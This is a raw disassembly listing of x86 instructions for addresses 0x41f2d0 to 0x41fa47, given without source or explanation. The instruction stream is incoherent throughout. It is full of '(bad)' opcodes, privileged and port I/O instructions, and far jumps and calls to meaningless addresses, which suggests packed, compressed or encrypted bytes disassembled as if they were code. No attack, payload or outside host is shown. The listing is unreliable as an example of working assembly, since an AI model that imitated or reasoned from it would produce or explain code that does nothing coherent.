  41f2d0:	add    BYTE PTR [eax],al
  41f2d2:	add    BYTE PTR [ebx-0x70],dh
  41f2d5:	neg    DWORD PTR [eax]
  41f2d7:	fadd   st(0),st
  41f2d9:	jbe    0x41f291
  41f2db:	push   edx
  41f2dc:	lods   eax,DWORD PTR ds:[esi]
  41f2dd:	xor    dh,BYTE PTR [ebx-0x4a]
  41f2e0:	mov    cl,0x4f
  41f2e2:	mov    esi,0xe5c955ad
  41f2e7:	mov    bl,0x34
  41f2e9:	(bad)  
  41f2ea:	popa   
  41f2eb:	scas   eax,DWORD PTR es:[edi]
  41f2ec:	or     BYTE PTR [ecx-0x146f2062],ch
  41f2f2:	xchg   DWORD PTR [eax-0x3b2b6c0d],eax
  41f2f8:	in     eax,0x2a
  41f2fa:	mov    ah,0x66
  41f2fc:	sbb    al,0x6
  41f2fe:	adc    eax,DWORD PTR [esi-0x2]
  41f301:	and    al,0x88
  41f303:	jbe    0x41f307
  41f305:	inc    ebp
  41f306:	scas   eax,DWORD PTR es:[edi]
  41f307:	(bad)  [edi-0x6fd1c1a1]
  41f30d:	sub    esp,DWORD PTR [ebp-0x789ca0dc]
  41f313:	xor    eax,0xbf03a7f3
  41f318:	call   0xec59593a
  41f31d:	retf   
  41f31e:	cmp    cl,dh
  41f320:	dec    ebx
  41f321:	or     DWORD PTR [ecx],0x6
  41f324:	retf   
  41f325:	sbb    al,0xfa
  41f327:	mov    ch,0xa2
  41f329:	pop    ds
  41f32a:	imul   ebx,ebp,0x35
  41f32d:	stos   DWORD PTR es:[edi],eax
  41f32e:	hlt    
  41f32f:	call   0x976c08c5
  41f334:	or     DWORD PTR [ebx+0x2d627ec8],esp
  41f33a:	repz jmp 0xdcbf57b
  41f340:	push   es
  41f341:	cmp    ch,BYTE PTR [ecx+0x62]
  41f344:	pop    es
  41f345:	syscall 
  41f347:	out    0x55,al
  41f349:	into   
  41f34a:	dec    esp
  41f34b:	ret    0x972
  41f34e:	out    dx,al
  41f34f:	mov    edi,0x80ff7727
  41f354:	adc    bl,bl
  41f356:	or     edi,DWORD PTR [edx]
  41f358:	pop    ss
  41f359:	outs   dx,DWORD PTR ds:[esi]
  41f35a:	xlat   BYTE PTR ds:[ebx]
  41f35b:	push   es
  41f35c:	push   0x2a
  41f35e:	adc    edx,DWORD PTR [edx+0x1613ac13]
  41f364:	lods   al,BYTE PTR ds:[esi]
  41f365:	mov    dl,0xde
  41f367:	cwde   
  41f368:	pop    ds
  41f369:	push   edi
  41f36a:	sub    edx,0x75
  41f36d:	retf   
  41f36e:	ret    0xd728
  41f371:	loop   0x41f372
  41f373:	push   edi
  41f374:	js     0x41f321
  41f376:	mov    WORD PTR [edi],es
  41f378:	fbstp  TBYTE PTR [edi-0x21]
  41f37b:	cdq    
  41f37c:	das    
  41f37d:	cdq    
  41f37e:	stos   BYTE PTR es:[edi],al
  41f37f:	mov    ecx,0x39
  41f384:	add    BYTE PTR [eax],al
  41f386:	add    BYTE PTR [eax],al
  41f388:	add    BYTE PTR [eax],al
  41f38a:	add    BYTE PTR [eax],cl
  41f38c:	div    DWORD PTR [edi+0x4a]
  41f38f:	dec    edx
  41f391:	cmp    eax,0x2e8eedf7
  41f396:	dec    eax
  41f397:	lods   eax,DWORD PTR ds:[esi]
  41f398:	cwde   
  41f399:	loop   0x41f3e2
  41f39b:	push   ecx
  41f39c:	xchg   ebp,eax
  41f39d:	add    DWORD PTR [eax],eax
  41f39f:	scas   al,BYTE PTR es:[edi]
  41f3a0:	add    BYTE PTR [eax],al
  41f3a2:	add    BYTE PTR [edx+0x1c],bl
  41f3a5:	sub    bl,bh
  41f3a7:	sbb    al,0xcf
  41f3a9:	shl    ebx,1
  41f3ab:	mov    ah,BYTE PTR [eax]
  41f3ad:	lds    ecx,FWORD PTR [ebp-0x647e7dc3]
  41f3b3:	mov    cl,BYTE PTR [edi+0x74]
  41f3b6:	stc    
  41f3b7:	addr16 pop edx
  41f3b9:	jecxz  0x41f358
  41f3bb:	xor    al,0xc3
  41f3bd:	dec    edx
  41f3be:	nop
  41f3bf:	xor    eax,0xd1257b67
  41f3c4:	in     eax,dx
  41f3c5:	fwait
  41f3c6:	sbb    eax,0x5df23e31
  41f3cb:	out    0x32,al
  41f3cd:	test   eax,0x14ed2208
  41f3d2:	jo     0x41f43b
  41f3d4:	mov    dl,0x36
  41f3d6:	jge    0x41f43d
  41f3d8:	xor    DWORD PTR [esi-0x47460a30],ecx
  41f3de:	nop
  41f3df:	or     DWORD PTR [esi+eax*1-0x59f14853],esi
  41f3e6:	clc    
  41f3e7:	test   DWORD PTR [esi],edx
  41f3e9:	neg    BYTE PTR [ebp-0x3b]
  41f3ec:	dec    edx
  41f3ed:	ins    DWORD PTR es:[edi],dx
  41f3ee:	mov    ds:0xa6b3ae77,al
  41f3f3:	loop   0x41f389
  41f3f5:	rcl    BYTE PTR [eax+0x2c7940be],0x6
  41f3fc:	xchg   ecx,ebx
  41f3fe:	ss hlt 
  41f400:	fcmovne st,st(5)
  41f402:	jb     0x41f3d1
  41f404:	mov    dh,0x6a
  41f406:	or     DWORD PTR [eax-0x11b613b7],esi
  41f40c:	fstp   TBYTE PTR [esi-0x65]
  41f40f:	out    0xb1,al
  41f411:	dec    ebx
  41f412:	sbb    BYTE PTR ds:0xdfb12890,bl
  41f418:	shl    DWORD PTR cs:[esi],cl
  41f41b:	push   0x758a9d3b
  41f420:	mov    bl,BYTE PTR [eax]
  41f422:	push   ecx
  41f423:	push   ebx
  41f424:	push   edi
  41f425:	enter  0x1f03,0x19
  41f429:	stos   BYTE PTR es:[edi],al
  41f42a:	push   es
  41f42b:	mov    eax,ds:0x1ff682a5
  41f430:	push   ss
  41f431:	mov    ds:0xfd309c22,eax
  41f436:	jb     0x41f464
  41f438:	rcl    DWORD PTR ds:0x199cc829,0x91
  41f43f:	push   edx
  41f440:	out    dx,al
  41f441:	mov    al,0x8
  41f443:	xor    al,0x34
  41f445:	(bad)  
  41f446:	sti    
  41f447:	pop    ss
  41f448:	clc    
  41f449:	pop    ecx
  41f44a:	sbb    ecx,ebx
  41f44c:	pop    ecx
  41f44d:	jmp    0x0:0x75f479
  41f454:	add    BYTE PTR [eax],al
  41f456:	add    BYTE PTR [eax],al
  41f458:	add    BYTE PTR [eax],al
  41f45a:	add    BYTE PTR [esi],dh
  41f45c:	arpl   WORD PTR [eax-0x10],bp
  41f45f:	jge    0x41f45c
  41f461:	mov    esi,0x8c7853e7
  41f466:	daa    
  41f467:	out    0x84,eax
  41f469:	or     DWORD PTR [ebx],edi
  41f46b:	call   DWORD PTR [ebp+0xae0001]
  41f471:	add    BYTE PTR [eax],al
  41f473:	mov    al,0x52
  41f475:	inc    eax
  41f476:	sbb    ecx,ebp
  41f478:	pop    esp
  41f479:	cli    
  41f47a:	lea    ebp,[edi]
  41f47c:	mov    al,ds:0x7934b7e6
  41f481:	rcl    DWORD PTR [ebp+0x26],cl
  41f484:	push   0xffffffdd
  41f486:	inc    esp
  41f487:	sbb    ecx,edx
  41f489:	push   ds
  41f48a:	mov    cl,0xd3
  41f48c:	xchg   esi,eax
  41f48d:	inc    edx
  41f48e:	jecxz  0x41f49a
  41f490:	sub    eax,0x91903ba0
  41f495:	pop    esp
  41f496:	push   esi
  41f497:	and    ch,bl
  41f499:	lods   al,BYTE PTR ds:[esi]
  41f49a:	sub    eax,0x6b525bf1
  41f49f:	cmp    eax,0x7a28bb10
  41f4a4:	dec    esp
  41f4a5:	adc    ecx,ebx
  41f4a7:	mov    bh,0x81
  41f4a9:	adc    esi,ebx
  41f4ab:	icebp  
  41f4ac:	or     ch,dl
  41f4ae:	arpl   WORD PTR [esi+0x44],bx
  41f4b1:	out    dx,al
  41f4b2:	xor    DWORD PTR [edi+0x4c],edi
  41f4b5:	pop    ecx
  41f4b6:	and    al,0xec
  41f4b8:	xor    al,0xb7
  41f4ba:	jns    0x41f525
  41f4bc:	(bad)  
  41f4bd:	cmp    bh,bl
  41f4bf:	mov    bl,0x19
  41f4c1:	test   BYTE PTR [ecx+0x61],bl
  41f4c4:	inc    edx
  41f4c5:	in     al,dx
  41f4c6:	outs   dx,BYTE PTR ds:[esi]
  41f4c7:	ja     0x41f4ec
  41f4c9:	cmp    al,cl
  41f4cb:	jmp    0xa8b9:0x619849fb
  41f4d2:	cmp    esi,ebx
  41f4d4:	out    0xab,al
  41f4d6:	scas   eax,DWORD PTR es:[edi]
  41f4d7:	outs   dx,BYTE PTR ds:[esi]
  41f4d8:	add    eax,DWORD PTR [esp+edi*8-0x5f32be4e]
  41f4df:	fs fs push esi
  41f4e2:	cmc    
  41f4e3:	ror    BYTE PTR [esi-0x27],cl
  41f4e6:	mov    eax,ds:0x4d8ce7b2
  41f4eb:	mov    WORD PTR [ecx],ss
  41f4ed:	adc    BYTE PTR [edx+0x387aa374],cl
  41f4f3:	ja     0x41f53d
  41f4f5:	sbb    al,0x47
  41f4f7:	pop    ecx
  41f4f8:	pop    es
  41f4f9:	sub    BYTE PTR [esi-0x5],bh
  41f4fc:	hlt    
  41f4fd:	test   al,0xd2
  41f4ff:	mov    ch,0x3d
  41f501:	repz popa 
  41f503:	jne    0x41f55a
  41f505:	push   esi
  41f506:	(bad)
  41f509:	lods   eax,DWORD PTR ds:[esi]
  41f50a:	das    
  41f50b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f50c:	lock lds edx,FWORD PTR [esi]
  41f50f:	lahf   
  41f510:	outs   dx,BYTE PTR ds:[esi]
  41f511:	xor    al,0x68
  41f513:	jge    0x41f545
  41f515:	push   edx
  41f516:	es jne 0x41f4b9
  41f519:	dec    eax
  41f51a:	add    al,0x1a
  41f51c:	call   0x673a820a
	...
  41f529:	add    BYTE PTR [eax],al
  41f52b:	daa    
  41f52c:	ss lahf 
  41f52e:	xor    DWORD PTR [edi+0x1536afb9],ebx
  41f534:	and    eax,0x63fd075b
  41f539:	xor    al,bh
  41f53b:	xchg   edi,eax
  41f53c:	mov    ds:0xae0001,eax
  41f541:	add    BYTE PTR [eax],al
  41f543:	dec    edx
  41f544:	pop    edi
  41f545:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f546:	inc    eax
  41f547:	mov    dh,0x17
  41f549:	ror    BYTE PTR [edi],0x56
  41f54c:	repz xor DWORD PTR [ebp+0x18],edi
  41f550:	int3   
  41f551:	test   al,0x51
  41f553:	fldcw  WORD PTR [ebx-0x3ff8c1de]
  41f559:	dec    ebx
  41f55a:	pusha  
  41f55b:	cmc    
  41f55c:	mov    bl,0xc6
  41f55e:	imul   ebx,DWORD PTR [eax+ebx*4+0x32],0x12
  41f563:	mov    edx,0xb526053d
  41f568:	out    dx,eax
  41f569:	fwait
  41f56a:	xor    DWORD PTR [eax],0x7310bfa6
  41f570:	push   eax
  41f571:	dec    edi
  41f572:	jg     0x41f574
  41f574:	cs adc bl,dh
  41f577:	jle    0x41f53a
  41f579:	adc    esp,DWORD PTR [esp+esi*2-0x44815275]
  41f580:	mov    al,ds:0x74a5978b
  41f585:	fild   WORD PTR [edx]
  41f587:	push   ebp
  41f588:	(bad)  [ecx+eax*1-0x3c]
  41f58c:	es push edi
  41f58e:	mov    cl,0x19
  41f590:	retf   0xbe11
  41f593:	daa    
  41f594:	aas    
  41f595:	aaa    
  41f596:	push   edi
  41f597:	stos   BYTE PTR es:[edi],al
  41f598:	and    DWORD PTR [ecx],edi
  41f59a:	(bad)  
  41f59b:	and    eax,0x9d23e947
  41f5a0:	mov    dh,0x79
  41f5a2:	jnp    0x41f597
  41f5a4:	out    0xbb,eax
  41f5a6:	push   ebx
  41f5a7:	mov    dl,0x49
  41f5a9:	adc    ecx,DWORD PTR [bx-0x62ea]
  41f5ae:	out    dx,al
  41f5af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f5b0:	inc    esp
  41f5b1:	push   cs
  41f5b2:	lock mov esp,ds
  41f5b5:	retf   
  41f5b6:	(bad)  
  41f5b7:	cmp    DWORD PTR [ebx],ebx
  41f5b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f5ba:	imul   ecx,DWORD PTR [ebp+0xb],0xffffffb6
  41f5be:	test   edx,eax
  41f5c0:	ret    0xc941
  41f5c3:	ds jle 0x41f609
  41f5c6:	mov    WORD PTR ds:0x3245286d,ds
  41f5cc:	cmp    esp,esp
  41f5ce:	das    
  41f5cf:	sbb    BYTE PTR [edi+0x55],dl
  41f5d2:	sbb    esi,DWORD PTR [edi+esi*8]
  41f5d5:	retf   
  41f5d6:	mov    eax,0xd6192454
  41f5db:	xor    DWORD PTR [ebx],ecx
  41f5dd:	aam    0xbe
  41f5df:	(bad)  
  41f5e0:	lds    eax,FWORD PTR [ecx-0x69]
  41f5e3:	inc    edx
  41f5e4:	test   al,0x56
  41f5e6:	das    
  41f5e7:	mov    ebp,0x91577929
  41f5ec:	arpl   WORD PTR [ebp+eiz*4+0xe26d],di
	...
  41f5fb:	aaa    
  41f5fc:	(bad)  
  41f5fd:	out    0xc2,eax
  41f5ff:	mul    ebx
  41f601:	aaa    
  41f602:	cmc    
  41f603:	xchg   ecx,eax
  41f604:	call   0x5980:0x2048eef4
  41f60b:	inc    ebp
  41f60c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f60d:	add    DWORD PTR [eax],eax
  41f60f:	scas   al,BYTE PTR es:[edi]
  41f610:	add    BYTE PTR [eax],al
  41f612:	add    BYTE PTR [edx],dl
  41f614:	cmpxchg edi,edi
  41f617:	pop    ss
  41f618:	ret    0xd508
  41f61b:	arpl   WORD PTR [ecx-0x6e],ax
  41f61e:	loop   0x41f621
  41f620:	enter  0xeeb8,0xca
  41f624:	in     al,dx
  41f625:	fs out dx,al
  41f627:	fld    TBYTE PTR [ebp-0x7d2f409c]
  41f62d:	stos   BYTE PTR es:[edi],al
  41f62e:	adc    BYTE PTR [ecx-0x1a],dl
  41f631:	jbe    0x41f6a0
  41f633:	jle    0x41f5fd
  41f635:	sbb    bl,BYTE PTR [eax+ebp*8-0x4e]
  41f639:	pop    es
  41f63a:	and    ebp,DWORD PTR [ebx+0x73]
  41f63d:	data16 into 
  41f63f:	into   
  41f640:	call   0x6da29256
  41f645:	jns    0x41f611
  41f647:	in     al,0x99
  41f649:	ds mov bl,0xa0
  41f64c:	repnz sti 
  41f64e:	popa   
  41f64f:	pushf  
  41f650:	test   DWORD PTR [ebp-0x17048fab],esi
  41f656:	sbb    BYTE PTR [ecx+0x79],0x59
  41f65a:	sub    DWORD PTR [ecx+0x185e7cc0],ebx
  41f660:	pop    esp
  41f661:	add    ah,cl
  41f663:	mov    ch,BYTE PTR [ecx-0x5a8d7b36]
  41f669:	push   ss
  41f66a:	mov    ebp,0xf58b8fe9
  41f66f:	nop
  41f670:	mov    DWORD PTR [ebx],ebp
  41f672:	jbe    0x41f6ab
  41f674:	stc    
  41f675:	mov    bl,0xa0
  41f677:	adc    dh,BYTE PTR [ebx-0x69f71cc0]
  41f67d:	and    dl,0xa3
  41f680:	adc    al,0xbc
  41f682:	arpl   WORD PTR [edi-0x666cb45f],bp
  41f688:	imul   ch
  41f68a:	inc    esi
  41f68b:	addr16 loope 0x41f703
  41f68e:	pop    esp
  41f68f:	mov    ebp,esi
  41f691:	adc    BYTE PTR [esp+ebp*1],cl
  41f694:	dec    esi
  41f695:	fwait
  41f696:	pop    eax
  41f697:	xlat   BYTE PTR ds:[ebx]
  41f698:	loope  0x41f68c
  41f69a:	jo     0x41f706
  41f69c:	or     ecx,DWORD PTR [si-0x70]
  41f6a0:	js     0x41f716
  41f6a2:	outs   dx,BYTE PTR ds:[esi]
  41f6a3:	int    0x3a
  41f6a5:	cmp    BYTE PTR [edx],dl
  41f6a7:	jno    0x41f676
  41f6a9:	inc    ebp
  41f6aa:	cs mov eax,0xa3de566b
  41f6b0:	push   edi
  41f6b1:	fdiv   QWORD PTR [eax+0x19]
  41f6b4:	add    al,BYTE PTR [ebp-0x1d]
  41f6b7:	mov    DWORD PTR [eax+0x6576b04c],ebx
  41f6bd:	push   ebp
  41f6be:	cmp    DWORD PTR [ecx+0x38],0x0
	...
  41f6ca:	add    BYTE PTR [esi],dl
  41f6cc:	aad    0xdf
  41f6ce:	out    dx,eax
  41f6cf:	fucomip st,st(7)
  41f6d1:	ss std 
  41f6d3:	cmp    BYTE PTR [esi+0x706a5f3a],al
  41f6d9:	out    dx,eax
  41f6da:	repnz rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6dd:	add    DWORD PTR [eax],eax
  41f6df:	scas   al,BYTE PTR es:[edi]
  41f6e0:	add    BYTE PTR [eax],al
  41f6e2:	add    BYTE PTR [ebx],dl
  41f6e4:	jo     0x41f686
  41f6e6:	jle    0x41f6f1
  41f6e8:	pop    ebx
  41f6e9:	addr16 push ebp
  41f6eb:	fst    QWORD PTR [eax+0x30]
  41f6ee:	addr16 into 
  41f6f0:	and    ecx,edx
  41f6f2:	inc    esi
  41f6f3:	push   ds
  41f6f4:	aas    
  41f6f5:	jae    0x41f685
  41f6f7:	inc    esp
  41f6f8:	ret    0x574
  41f6fb:	(bad)  
  41f6fc:	imul   ecx,ebp,0x72
  41f6ff:	jae    0x41f6c0
  41f701:	dec    ebx
  41f702:	loope  0x41f70e
  41f704:	fsubr  st,st(6)
  41f706:	aas    
  41f707:	cwde   
  41f708:	scas   al,BYTE PTR es:[edi]
  41f709:	push   es
  41f70a:	cs pop es
  41f70c:	jmp    0x41f78d
  41f70e:	out    dx,al
  41f70f:	xchg   esp,eax
  41f710:	popf   
  41f711:	mov    es,WORD PTR [ecx+0x2b08d17d]
  41f717:	mov    al,0x57
  41f719:	dec    ebx
  41f71a:	sub    al,0xa3
  41f71c:	cdq    
  41f71d:	mov    ebx,0x2df0d540
  41f722:	aas    
  41f723:	pushf  
  41f724:	jae    0x41f6b0
  41f726:	stos   DWORD PTR es:[edi],eax
  41f727:	scas   al,BYTE PTR es:[edi]
  41f728:	dec    edi
  41f729:	out    dx,al
  41f72a:	add    al,0x8c
  41f72c:	pop    es
  41f72d:	xor    eax,edi
  41f72f:	push   cs
  41f730:	lock mov eax,0xae102fec
  41f736:	fwait
  41f737:	inc    ecx
  41f738:	scas   al,BYTE PTR es:[edi]
  41f739:	in     al,0xab
  41f73b:	nop
  41f73c:	sti    
  41f73d:	pop    ds
  41f73e:	jbe    0x41f798
  41f740:	adc    bh,bl
  41f742:	jnp    0x41f70a
  41f744:	mov    eax,0x4dc159b3
  41f749:	mov    ds:0x5b596f74,al
  41f74e:	repz es adc eax,0x55ef12e8
  41f755:	mov    ds:0x92d54ecb,eax
  41f75a:	out    dx,eax
  41f75b:	ret    
  41f75c:	adc    ax,0x68e1
  41f760:	inc    ecx
  41f761:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f762:	mov    ecx,0xa8b59ed4
  41f767:	clc    
  41f768:	arpl   ax,bx
  41f76a:	les    edx,FWORD PTR [edx]
  41f76c:	jge    0x41f707
  41f76e:	int    0xb6
  41f770:	lahf   
  41f771:	fistp  WORD PTR [edx]
  41f773:	pushw  ds
  41f775:	xchg   esp,eax
  41f776:	jle    0x41f7be
  41f778:	fbld   TBYTE PTR [ebx-0x1a]
  41f77b:	mov    edx,0x3248de9f
  41f780:	add    DWORD PTR [edx+edx*1-0x1a75e4b7],esp
  41f787:	loopne 0x41f7c8
  41f789:	std    
  41f78a:	leave  
  41f78b:	pushf  
  41f78c:	xor    DWORD PTR [ebp+0x2b],ecx
  41f78f:	jmp    0x0:0x77
  41f796:	add    BYTE PTR [eax],al
  41f798:	add    BYTE PTR [eax],al
  41f79a:	add    BYTE PTR [esi+0x76],ch
  41f79d:	in     al,0xca
  41f79f:	cld    
  41f7a0:	fisubr DWORD PTR [esi-0xa]
  41f7a3:	sbb    BYTE PTR [edx+0x53d89787],dl
  41f7a9:	cs dec esi
  41f7ab:	mov    eax,ds:0xae0001a5
  41f7b0:	add    BYTE PTR [eax],al
  41f7b2:	add    BYTE PTR [edx+0xe],ah
  41f7b5:	or     DWORD PTR [ebx+0x61],edx
  41f7b8:	retf   
  41f7b9:	mov    ah,0xc2
  41f7bb:	ret    
  41f7bc:	and    eax,0x6480488
  41f7c1:	loopne 0x41f772
  41f7c3:	adc    ax,0xccbc
  41f7c7:	or     esp,DWORD PTR [ebp+0x2c651beb]
  41f7cd:	dec    ecx
  41f7ce:	fsubr  st,st(0)
  41f7d0:	scas   al,BYTE PTR es:[edi]
  41f7d1:	das    
  41f7d2:	jo     0x41f838
  41f7d4:	mov    ch,0x9b
  41f7d6:	aam    0x8
  41f7d8:	xchg   edi,eax
  41f7d9:	add    BYTE PTR [esi-0x6c],cl
  41f7dc:	or     DWORD PTR ds:0x8730787b,0x8678cf5c
  41f7e6:	rol    dh,0x65
  41f7e9:	call   0x1bc66173
  41f7ee:	mov    ecx,0x72fe9099
  41f7f3:	stos   BYTE PTR es:[edi],al
  41f7f4:	test   eax,0xcc432905
  41f7f9:	iret   
  41f7fa:	jecxz  0x41f7c4
  41f7fc:	fsubr  DWORD PTR [eax+ebx*2-0x3e]
  41f800:	add    al,0x6
  41f802:	add    al,al
  41f804:	dec    ebp
  41f805:	and    eax,0xfc11201e
  41f80a:	dec    edx
  41f80b:	cmp    DWORD PTR [ebx-0xe],ebp
  41f80e:	xchg   esp,eax
  41f80f:	dec    ebx
  41f810:	mov    BYTE PTR [edx-0x53],cl
  41f813:	jbe    0x41f844
  41f815:	sub    al,0xc
  41f817:	jb     0x41f7d3
  41f819:	and    ah,0xef
  41f81c:	clc    
  41f81d:	(bad)
  41f820:	xchg   ebp,eax
  41f821:	adc    DWORD PTR [edi],edx
  41f823:	jmp    0x41f842
  41f825:	add    DWORD PTR [ebx+0x5fef4be8],esp
  41f82b:	add    eax,eax
  41f82d:	jg     0x41f7b8
  41f82f:	scas   al,BYTE PTR es:[edi]
  41f830:	mov    ebx,0x93946a38
  41f835:	ins    DWORD PTR es:[edi],dx
  41f836:	into   
  41f837:	wrmsr  
  41f839:	and    eax,0xcca7424f
  41f83e:	jno    0x41f824
  41f840:	mov    ds:0xcc079f8b,al
  41f845:	and    ecx,DWORD PTR [esi-0x18e49db1]
  41f84b:	in     al,0x19
  41f84d:	and    al,0xfd
  41f84f:	test   al,0xdc
  41f851:	sub    ebp,esi
  41f853:	mov    esp,DWORD PTR [edx+ebp*2-0x64571d69]
  41f85a:	jl     0x41f7f5
  41f85c:	or     eax,0x497e24b5
	...
  41f869:	add    BYTE PTR [eax],al
  41f86b:	cmp    dl,BYTE PTR [edx-0x3c]
  41f86e:	paddsb mm3,QWORD PTR [edi-0x2e098805]
  41f875:	nop
  41f876:	ror    DWORD PTR [esi*1-0x59b08b0d],cl
  41f87d:	add    DWORD PTR [eax],eax
  41f87f:	scas   al,BYTE PTR es:[edi]
  41f880:	add    BYTE PTR [eax],al
  41f882:	add    BYTE PTR [ebx+0x432e451e],bh
  41f888:	add    DWORD PTR [eax],ecx
  41f88a:	adc    DWORD PTR [ecx-0x1156f148],esi
  41f890:	out    dx,eax
  41f891:	fadd   QWORD PTR [eax+0x3c588aae]
  41f897:	inc    edx
  41f898:	lahf   
  41f899:	sub    dl,bh
  41f89b:	cmp    al,0x8
  41f89d:	xor    al,0xb0
  41f89f:	hlt    
  41f8a0:	mov    ebx,0x8e18ea8c
  41f8a5:	sub    eax,0x9963f408
  41f8aa:	out    dx,al
  41f8ab:	xor    ah,0x69
  41f8ae:	div    DWORD PTR ds:0x2ad659b9
  41f8b4:	add    BYTE PTR ds:0x5d401509,0xa5
  41f8bb:	mov    fs,WORD PTR [edx+0x7ad5638]
  41f8c1:	inc    esi
  41f8c2:	ret    
  41f8c3:	dec    esp
  41f8c4:	div    DWORD PTR [esi-0x3a]
  41f8c7:	(bad)
  41f8cc:	sub    eax,0x6e70c8cd
  41f8d1:	ret    
  41f8d2:	mov    WORD PTR [ecx+ebp*4+0x18d19184],ss
  41f8d9:	xlat   BYTE PTR ds:[ebx]
  41f8da:	mov    ebx,0xa9da573b
  41f8df:	or     al,0x1b
  41f8e1:	rcr    DWORD PTR [edx+edi*4],cl
  41f8e4:	repz and eax,0xfd75bb3f
  41f8ea:	aam    0x6a
  41f8ec:	into   
  41f8ed:	retf   0x4e33
  41f8f0:	add    ebx,ebx
  41f8f2:	sbb    edx,ebx
  41f8f4:	jnp    0x41f903
  41f8f6:	sub    BYTE PTR [ebp+0x5fa9f0be],bl
  41f8fc:	sbb    eax,0x49ed8a8d
  41f901:	stc    
  41f902:	out    0x7c,al
  41f904:	es mov ecx,0xbd820e4f
  41f90a:	push   0xd42a2c76
  41f90f:	inc    ebp
  41f910:	add    bh,dh
  41f912:	xlat   BYTE PTR ds:[ebx]
  41f913:	or     bl,BYTE PTR ds:0x5de0e6d2
  41f919:	cdq    
  41f91a:	nop
  41f91b:	push   edx
  41f91c:	lea    ebp,[edx+ebp*1+0x1196747d]
  41f923:	sub    BYTE PTR [ecx+0x27],dl
  41f926:	jmp    0x41f988
  41f928:	and    esp,edx
  41f92a:	dec    edi
  41f92b:	jge    0x41f914
  41f92d:	rcr    BYTE PTR [edi],1
  41f92f:	sub    ch,ah
	...
  41f939:	add    BYTE PTR [eax],al
  41f93b:	xchg   ebx,eax
  41f93c:	cmp    DWORD PTR [ebp-0x2c814294],0xffffffff
  41f943:	push   eax
  41f944:	loopne 0x41f940
  41f946:	call   0xa6fd:0xbb82c9ed
  41f94d:	add    DWORD PTR [eax],eax
  41f94f:	scas   al,BYTE PTR es:[edi]
  41f950:	add    BYTE PTR [eax],al
  41f952:	add    al,bh
  41f954:	cli    
  41f955:	xor    BYTE PTR [eax-0x37],ch
  41f958:	popf   
  41f959:	or     al,0x90
  41f95b:	cwd    
  41f95d:	add    al,0xef
  41f95f:	mov    eax,0x6bc29f8f
  41f964:	mov    bh,0x26
  41f966:	push   cs
  41f967:	mov    ds:0x1c68de1e,eax
  41f96c:	pop    esi
  41f96d:	add    esi,DWORD PTR [ecx]
  41f96f:	loopne 0x41f959
  41f971:	arpl   WORD PTR [esi+0x4365f416],bx
  41f977:	mov    al,0x83
  41f979:	mov    edx,0x88f1ffaf
  41f97e:	repz push 0x2e
  41f981:	mov    BYTE PTR [ebx-0x804cc5],bh
  41f987:	pop    edi
  41f988:	fst    DWORD PTR [ebx]
  41f98a:	fmul   QWORD PTR [edi+0x3b]
  41f98d:	call   0x87a0:0x5825ef15
  41f994:	icebp  
  41f995:	jo     0x41f944
  41f997:	pop    eax
  41f998:	arpl   bp,bp
  41f99a:	cmc    
  41f99b:	hlt    
  41f99c:	jmp    0xf5e5:0x6f3d8226
  41f9a3:	icebp  
  41f9a4:	nop
  41f9a5:	mov    dh,0xd2
  41f9a7:	pop    ss
  41f9a8:	pop    esp
  41f9a9:	and    BYTE PTR [ebx+0x19],dl
  41f9ac:	pop    ebp
  41f9ad:	stos   DWORD PTR es:[edi],eax
  41f9ae:	scas   al,BYTE PTR es:[edi]
  41f9af:	mov    esp,DWORD PTR [edx+0x15]
  41f9b2:	xor    ecx,ebp
  41f9b4:	xlat   BYTE PTR ds:[ebx]
  41f9b5:	dec    esi
  41f9b6:	pop    ss
  41f9b7:	mov    eax,DWORD PTR [ecx-0x383848fd]
  41f9bd:	ins    BYTE PTR es:[edi],dx
  41f9be:	aam    0xb4
  41f9c0:	in     al,dx
  41f9c1:	mov    ebx,0xbb3858fc
  41f9c6:	fidiv  DWORD PTR ds:0xc3387244
  41f9cc:	in     al,0x31
  41f9ce:	sub    BYTE PTR [edi-0x35],bh
  41f9d1:	pop    ebp
  41f9d2:	push   ecx
  41f9d3:	or     edi,eax
  41f9d5:	fld    QWORD PTR [edx]
  41f9d7:	and    eax,0x7cf0beae
  41f9dc:	add    eax,0x59b85024
  41f9e1:	(bad)  
  41f9e2:	mov    bl,0xd8
  41f9e4:	and    ch,BYTE PTR ds:0x3ffb88a9
  41f9ea:	dec    ebp
  41f9eb:	pop    ebx
  41f9ec:	rol    BYTE PTR [edx+0x33f3ba82],cl
  41f9f2:	aaa    
  41f9f3:	inc    ecx
  41f9f4:	test   DWORD PTR [ebx+edx*2+0x49],edi
  41f9f8:	pop    es
  41f9f9:	out    dx,al
  41f9fa:	pop    esp
  41f9fb:	xlat   BYTE PTR ds:[ebx]
  41f9fc:	loop   0x41f9f6
  41f9fe:	adc    DWORD PTR [edi+0xe4],edx
  41fa04:	add    BYTE PTR [eax],al
  41fa06:	add    BYTE PTR [eax],al
  41fa08:	add    BYTE PTR [eax],al
  41fa0a:	add    ah,bl
  41fa0c:	fincstp 
  41fa0e:	shl    bh,0xee
  41fa11:	(bad)  
  41fa12:	frstor [ecx+eax*1]
  41fa15:	pop    ebp
  41fa16:	dec    edi
  41fa17:	mov    WORD PTR [ebx],?
  41fa19:	pop    esi
  41fa1a:	outs   dx,BYTE PTR ds:[esi]
  41fa1b:	stos   DWORD PTR es:[edi],eax
  41fa1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa1d:	add    DWORD PTR [eax],eax
  41fa1f:	scas   al,BYTE PTR es:[edi]
  41fa20:	add    BYTE PTR [eax],al
  41fa22:	add    ah,ah
  41fa24:	add    eax,0xa443a6f
  41fa29:	shl    cl,cl
  41fa2b:	das    
  41fa2c:	sub    eax,0xa717af03
  41fa31:	jle    0x41fa95
  41fa33:	popa   
  41fa34:	jne    0x41fa74
  41fa36:	dec    ebx
  41fa37:	pop    esp
  41fa38:	out    0xad,al
  41fa3a:	mov    esi,0xa374c1d7
  41fa3f:	repz jne 0x41fa13
  41fa42:	jle    0x41fa40
  41fa44:	jecxz  0x41f9f3
  41fa46:	pop    es
  41fa47:	xchg   ebx,eax
